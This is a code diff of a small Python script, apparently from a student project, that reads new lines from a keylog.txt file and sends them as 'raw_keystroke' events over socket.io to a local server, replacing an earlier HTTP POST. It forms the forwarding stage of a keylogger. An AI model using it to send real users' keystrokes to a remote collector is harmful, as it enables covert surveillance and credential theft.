@@ -1,10 +1,17 @@
-import requests
 import time
+import os
+import socketio as sio_module
 
-SERVER_URL = "http://127.0.0.1:2000/log"
-LOG_FILE = r"C:\Users\chall\Downloads\final project\frontend\keylog.txt"
+SERVER_URL = "http://127.0.0.1:2000"
+LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylog.txt")
 
 last_position = 0
+
+sio = sio_module.Client(reconnection=True)
+try:
+    sio.connect(SERVER_URL)
+except Exception as e:
+    print(f"Failed to connect to server: {e}")
 
 while True:
     try:
@@ -13,14 +20,14 @@ while True:
             new_lines = f.readlines()
             last_position = f.tell()
 
-        if new_lines:
-            payload = {
-                "logs": [line.strip() for line in new_lines]
-            }
+        if new_lines and sio.connected:
+            for line in new_lines:
+                sio.emit('raw_keystroke', {
+                    'char': line.strip(),
+                    'app_name': 'keylog_replay'
+                })
 
-            r = requests.post(SERVER_URL, json=payload, timeout=5)
-
-            print("Sent:", len(new_lines), "lines", "| Server:", r.status_code)
+            print("Sent:", len(new_lines), "lines")
 
     except Exception as e:
         print("Error:", e)
